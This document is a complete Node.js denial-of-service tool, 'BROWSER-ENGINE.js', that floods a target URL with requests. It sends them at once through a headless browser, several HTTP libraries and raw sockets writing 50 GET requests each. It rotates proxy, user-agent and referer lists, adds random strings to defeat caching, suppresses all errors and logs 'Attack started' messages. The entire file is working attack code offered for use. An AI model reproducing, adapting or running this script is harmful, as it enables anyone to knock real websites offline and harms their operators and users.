const url = require("url");
const chalk = require("chalk");
const EventEmitter = require('events');
const fs = require('fs');
const Browser = require('zombie');
const superagent = require('superagent');
require('superagent-proxy')(superagent)
const axios = require('axios');
const request = require('request');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;

process.on('uncaughtException', function (err) { }); //hataları yok et
process.on('unhandledRejection', function (err) { }); //hataları yok et

if(process.argv.length != 9)
{
    console.log(chalk.red(`Wrong Usage!`));
    console.log(chalk.yellow(`Usage: node BROWSER-ENGINE.js [URL] [TIME] [UA-FILE] [THREADS] [METHOD] [PROXY-FILE] [REFERER-FILE]`));
    process.exit(3162);
}

var target = process.argv[2];
var time = process.argv[3];
var useragentFile = process.argv[4];
var threads = process.argv[5];
var method = process.argv[6];
var proxiesFile = process.argv[7];
var refererFile = process.argv[8];
var targetPathname = url.parse(target).path;
var targetHost = url.parse(target).host;
originTarget = target;

const proxies = fs.readFileSync(proxiesFile, 'utf-8').match(/\S+/g);
const userAgents = fs.readFileSync(useragentFile, 'utf-8').replace(/\r/g, '').split('\n');
const referers = fs.readFileSync(refererFile, 'utf-8',).replace(/\r/g, '').split('\n');

console.log(chalk.green(`Attack started on ${target} for ${time} seconds!`));
var browser = new Browser();

function BrowserEngine()
{
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    var userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    var referer = referers[Math.floor(Math.random() * referers.length)];

    target = originTarget.replace(/%RAND%/g, RandomString(RandomInteger(4, 16)));

    console.log(chalk.green(`Attacking --> ${target} Proxy --> [${proxy}]`));
    
    BrowserRequest(target, proxy, userAgent, referer);
    FastFlood(target, targetHost, method, proxy, userAgent, referer);
    SuperAgentRequest(target, proxy, userAgent, referer);
    AxiosRequest(target, method, proxy, userAgent, referer);
    NormalRequest(target, method, proxy, userAgent, referer);
}

setInterval(() => {
    BrowserEngine();
});

setTimeout(() => process.exit(0), time * 1000);

function SuperAgentRequest(targetString, proxyString, uaString, refererString)
{
    superagent
        .get(targetString)
        .proxy("http://" + proxyString)
        .timeout(3600*1000)
        .set('User-Agent', uaString)
        .set("Referer", refererString)
        .set('Cache-Control', 'no-cache')
        .set('Connection', 'Keep-Alive')
        .set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9')
        .set('Accept-Encoding', 'gzip, deflate, br')
        .set('Accept-Language', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7')
        .set('Pragma', 'no-cache')
        .set('Sec-Fetch-Dest', 'document')
        .set('Sec-Fetch-Mode', 'navigate')
        .set('Sec-Fetch-User', '?1')
        .set('Upgrade-Insecure-Requests', "1")
        .end((err, res) => {
        if(err) {
            //console.error(err);
            return;
        }
    });
}

function BrowserRequest(targetString, proxyString, uaString, refererString)
{
    browser.proxy = "http://" + proxyString;

    browser.headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "Keep-Alive",
        "Referer": refererString,
        "User-Agent": uaString
    };
    
    browser.maxDuration = 400e3;
    browser.maxWait = 380e3;
    browser.waitDuration = '1000s';
    browser.visit(targetString, () => {
        browser.wait(370e3, () => {
            browser.reload();
            browser.wait(50e3, async () => {
                await browser.deleteCookies();
                await browser.window.close();
                await browser.destroy();
                browser = undefined;
                delete browser;
                return false;
            });
        });
    });
}

function AxiosRequest(targetString, methodString, proxyString, uaString, refererString)
{
    const config = {
        method: methodString,
        url: targetString,
        headers: { 
            'User-Agent': uaString,
            'Referer': refererString,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': "1",
            'Connection': 'Keep-Alive'
        },
        proxy: {
            host: proxyString.split(":")[0],
            port: proxyString.split(":")[1]
        }
    }
    axios(config);
}

function NormalRequest(targetString, methodString, proxyString, uaString, refererString)
{
    request({ 
        url: targetString,
        method: methodString,
        proxy: 'http://' + proxyString,
        headers: {
            'User-Agent': uaString,
            'Referer': refererString,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': "1",
            'Connection': 'Keep-Alive'
        }
    });
}

function FastFlood(targetString, targetHostString, methodString, proxyString, uaString, refererString)
{
    var Socket = require('net').Socket();
    Socket.connect(proxyString.split(":")[1], proxyString.split(":")[0]);
    //Socket.setTimeout(10000);
    for (var i = 0; i < 50; i++) {
        Socket.write(`GET ${targetString} HTTP/1.1\r\nHost: ${targetHostString}\r\nReferer: ${refererString}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\nPragma: no-cache\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\nUser-Agent: ${uaString}\r\nConnection: Keep-Alive\r\n\r\n`);
    }
    Socket.on('data', function () { setTimeout(function () { Socket.destroy(); return delete Socket; }, 5000); })
}

function RandomInteger(min, max) {  
  return Math.floor(
    Math.random() * (max - min) + min
  )
}

function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}